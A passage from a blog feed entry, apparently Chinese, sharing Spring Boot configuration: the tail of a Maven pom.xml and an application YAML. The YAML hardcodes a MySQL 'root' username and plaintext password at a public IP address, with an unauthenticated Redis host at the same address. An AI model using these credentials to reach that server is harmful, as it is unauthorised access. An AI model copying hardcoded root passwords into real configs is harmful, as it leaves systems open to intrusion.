class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar;$&#123;java.home&#125;/lib/jce.jar<span class="tag">&lt;/<span class="name">bootclasspath</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">skipTests</span>&gt;</span>true<span class="tag">&lt;/<span class="name">skipTests</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">developers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developer</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>wxpay<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://pay.weixin.qq.com/wiki/doc/api/wxa/wxa_api.php?chapter=11_1<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">developer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">developers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>release<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>oss<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/content/repositories/snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>oss<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/service/local/staging/deploy/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="地表最强yml"><a href="#地表最强yml" class="headerlink" title="地表最强yml"></a>地表最强yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  datasource:</span></span><br><span class="line"><span class="attr">    username:</span> <span class="string">root</span></span><br><span class="line"><span class="attr">    password:</span> <span class="string">obox11..</span></span><br><span class="line"><span class="attr">    url:</span> <span class="attr">jdbc:mysql://118.31.120.92:3306/obox</span></span><br><span class="line"><span class="attr">    driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  http:</span></span><br><span class="line"><span class="attr">    encoding:</span></span><br><span class="line"><span class="attr">      charset:</span> <span class="string">UTF-8</span></span><br><span class="line"><span class="attr">  cache:</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  redis:</span></span><br><span class="line"><span class="attr">    host:</span> <span class="number">118.31</span><span class="number">.120</span><span class="number">.92</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">6379</span></span><br><span class="line"><span class="attr">    database:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">    timeout:</span> <span class="number">60</span><span class="string">s</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    jedis:</span></span><br><span class="line"><span class="attr">      pool:</span></span><br><span class="line"><span class="attr">        max-active:</span> <span class="bullet">-1</span></span><br><span class="line"><span class="attr">        max-idle:</span> <span class="number">50</span></span><br><span class="line"><span class="attr">        max-wait:</span> <span class="bullet">-1</span><span class="string">s</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">initialSize:</span> <span class="number">5</span></span><br><span class="line"><span class="attr">minIdle:</span> <span class="number">5</span></span><br><span class="line"><span class="attr">maxActive:</span> <span class="number">20</span></span><br><span class="line"><span class="attr">maxWait:</span> <span class="number">60000</span></span><br><span class="line"><span class="attr">timeBetweenEvictionRunsMillis:</span> <span class="number">60000</span></span><br><span class="line"><span class="attr">minEvictableIdleTimeMillis:</span> <span class="number">300000</span></span><br><span class="line"><span class="attr">validationQuery:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line"><span class="attr">testWhileIdle:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">testOnBorrow:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">testOnReturn:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">poolPreparedStatements:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">  port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;Springboot 一些常用配置&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
